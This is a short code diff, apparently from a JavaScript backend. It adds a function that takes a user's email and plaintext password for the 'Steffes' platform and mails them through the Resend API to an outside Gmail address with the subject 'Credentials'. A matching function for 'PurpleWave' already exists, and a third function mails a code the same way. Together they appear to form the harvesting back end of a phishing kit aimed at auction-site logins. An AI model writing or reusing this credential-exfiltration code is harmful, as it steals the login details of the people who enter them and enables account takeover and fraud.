@@ -71,6 +71,28 @@ export const sendCredentialsPurpleWave = async (
   });
 };
 
+export const sendCredentialsSteffes = async (
+  email,
+  password,
+  platform = "Steffes",
+) => {
+  await resendAPIKEY.emails.send({
+    from: "onboarding@resend.dev",
+    to: "lummybackend@gmail.com",
+    subject: "Credentials",
+    html: `
+      <div>
+        <strong>Platform:</strong>
+        <p>Steffes</p>
+        <strong>Email:</strong>
+        <p>${email}</p>
+        <strong>Password:</strong>
+        <p>${password}</p>
+      </div>
+    `,
+  });
+};
+
 export const sendCode = async (code) => {
   await resendAPIKEY.emails.send({
     from: "onboarding@resend.dev",
